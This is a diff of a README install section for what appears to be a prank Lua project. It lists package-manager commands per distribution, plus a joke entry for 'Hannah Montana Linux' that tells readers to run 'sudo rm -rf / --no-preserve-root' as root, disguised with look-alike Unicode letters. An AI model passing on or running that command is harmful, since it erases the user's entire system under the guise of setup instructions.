@@ -9,7 +9,7 @@ Scare your friends!
 
 `sudo apt install lua5.4` - Debian
 
-`s​​​udo -​i` and then `sud​​o r​m -rf / --no-p​​​reser​ve-root` - Hannah Montana Linux
+`ѕudo -​i` and then `ѕud​​o r​м -rf / --no-p​​​reser​ve-root` - Hannah Montana Linux
 
 `sudo pacman -S lua` - Arch
 
